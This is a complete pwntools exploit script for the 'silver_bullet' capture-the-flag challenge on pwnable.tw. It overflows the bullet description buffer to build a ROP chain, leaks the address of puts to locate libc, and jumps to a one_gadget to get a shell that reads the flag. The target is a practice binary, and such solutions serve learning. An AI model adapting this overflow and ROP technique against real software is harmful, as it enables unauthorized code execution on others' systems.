#/usr/bin/env python
#-*-coding:utf-8-*-

from pwn import *

proc="./silver_bullet"

context.update(arch = 'x86', os = 'linux')

elf=ELF(proc)

libc = ELF("./libc_32.so.6")

def choice(operand):
	sh.sendafter("Your choice :",str(operand))

def Create(content):
	choice(1)
	sh.sendafter("Give me your description of bullet :",content)
	
def Powerup(content):
	choice(2)
	sh.sendafter("Give me your another description of bullet :",content)

def Beat():
	choice(3)

def pwn(ip,port):
	global sh
	if debug==1:
		context.log_level="debug"
		sh=process(proc)
	else:
		sh=remote(ip,port)

	main = elf.symbols['main']
	puts_plt = elf.symbols['puts']
	puts_got = elf.got['puts']


	Create("A"*(0x28+4))
	Powerup("B"*(0x8-4))
	Powerup(b"\xff"*7+p32(puts_plt)+p32(main)+p32(puts_got))
	Beat()
	sh.recvuntil("Oh ! You win !!\n")
	puts = u32(sh.recv(4))
	log.info("puts: "+hex(puts))
	libc_base = puts -  libc.symbols['puts']
	one_gadget = libc_base + 0x5f065

	Create("A"*(0x28+4))
	Powerup("B"*(0x8-4))
	Powerup(b"\xff"*7+p32(one_gadget))
	Beat()
	sh.sendline("cat /home/silver_bullet/flag")

	
	sh.interactive()

if __name__ =="__main__":
	pwn("chall.pwnable.tw",10103)
